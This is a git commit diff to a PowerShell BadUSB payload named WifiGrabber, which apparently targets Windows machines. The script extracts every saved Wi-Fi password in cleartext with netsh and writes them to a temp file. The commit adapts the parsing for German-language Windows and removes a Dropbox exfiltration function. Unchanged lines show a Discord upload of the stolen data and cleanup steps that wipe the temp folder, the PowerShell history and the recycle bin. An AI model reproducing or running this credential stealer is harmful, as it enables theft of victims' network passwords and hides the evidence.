dd04f2dd947e3c3efb2f63ccb3fa689339026ec8
Chris H <christian.haip@gmail.com>
2024-02-14 19:46:50 +0100

    improve for german & cleanmans

--- Payloads/Flip-WifiGrabber/WifiGrabber.ps1
+++ Payloads/Flip-WifiGrabber/WifiGrabber.ps1
@@ -1,35 +1,9 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Schlüsselinhalt\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
-
-############################################################################################################################################################
-
-# Upload output file to Dropbox
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
 
 ############################################################################################################################################################
 
@@ -62,8 +36,6 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-
 
 ############################################################################################################################################################
 
-function Clean-Exfil { 
-
 # empty temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
@@ -76,11 +48,6 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 # Empty recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-}
-
-############################################################################################################################################################
-
-if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
 RI $env:TEMP/--wifi-pass.txt
